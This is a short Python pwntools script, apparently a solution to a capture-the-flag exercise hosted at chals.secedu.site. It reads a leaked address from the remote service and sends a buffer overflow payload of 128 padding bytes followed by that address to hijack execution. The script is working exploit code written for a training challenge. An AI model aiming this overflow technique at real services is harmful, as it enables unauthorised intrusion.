from pwn import *

host = "chals.secedu.site"
port = 5001
offset = 128

elf = ELF("./chal")
# this for debugging purpose, real deal is remote()
# p = elf.process()
p = remote(host, port)

info = p.recv()
addr = info.split(b'\n')[0].split()[-1]
addr = int(addr.decode(), 16)
log.info(info)

payload = b'O' * offset + p32(addr)

p.sendline(payload)
log.success(p.recv())
